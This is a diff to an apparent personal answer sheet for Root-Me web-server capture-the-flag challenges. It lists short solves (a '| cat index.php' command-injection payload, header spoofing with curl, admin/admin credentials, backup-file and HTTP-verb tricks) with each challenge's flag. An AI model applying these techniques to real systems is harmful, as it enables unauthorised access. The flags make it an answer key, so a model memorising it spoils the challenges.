@@ -10,3 +10,56 @@ solve:  curl -G http://challenge01.root-me.org/web-serveur/ch52/ -d "url=https:/
 
 - e6f8a530811d5a479812d7b82fc1a5c5 
 
+
+## HTTP - User-agent
+
+
+solve: curl -H "User-Agent: admin" http://challenge01.root-me.org/web-serveur/ch2/
+
+- rr$Li9%L34qd1AAe27
+
+
+## Mot de passe faible
+
+solve: admin/admin
+
+- admin
+
+## PHP - Injection de commande
+
+solve: | cat index.php 
+
+- S3rv1ceP1n9Sup3rS3cure
+
+## Fichier de sauvegarde
+
+solve: index.php~ 
+
+- OCCY9AcNm1tj
+
+## HTTP - Directory indexing
+
+hint: admin/backup/admin.txt
+
+- LINUX
+
+## HTTP - Headers
+hint: python headers.py ou curl --header "Header-RootMe-Admin:admin" http://challenge01.root-me.org/web-serveur/ch5/
+
+- HeadersMayBeUseful
+
+## HTTP - Post
+hint: supprimer le js et modifier le score
+
+- H7tp_h4s_N0_s3Cr37S_F0r_y0U
+
+## HTTP - Improper redirect
+hint: curl http://challenge01.root-me.org/web-serveur/ch32/
+
+- ExecutionAfterRedirectIsBad
+
+## HTTP - Verb tampering
+
+hint: curl -X PUT http://challenge01.root-me.org/web-serveur/ch8/
+
+- a23e$dme96d3saez$$prap
